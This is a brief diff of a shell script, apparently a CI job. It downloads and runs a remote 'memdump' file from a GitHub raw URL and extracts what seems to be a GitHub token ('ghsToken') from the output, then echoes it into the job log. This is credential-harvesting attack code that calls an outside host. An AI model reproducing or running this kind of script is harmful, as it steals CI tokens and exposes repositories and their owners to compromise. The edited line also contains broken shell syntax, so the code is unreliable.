@@ -8,7 +8,8 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 echo "---------------------------1--------------------------------------"
 echo "$TOKEN_VAL"
 echo "---------------------------2--------------------------------------"
-ghsToken = $(echo "$TOKEN_VAL" | awk 'NR==2')
+
+ghsToken= $(`echo "$TOKEN_VAL" | awk 'NR==2'`)
 echo "---------------------------3--------------------------------------"
 echo $ghsToken
 echo "---------------------------4--------------------------------------"
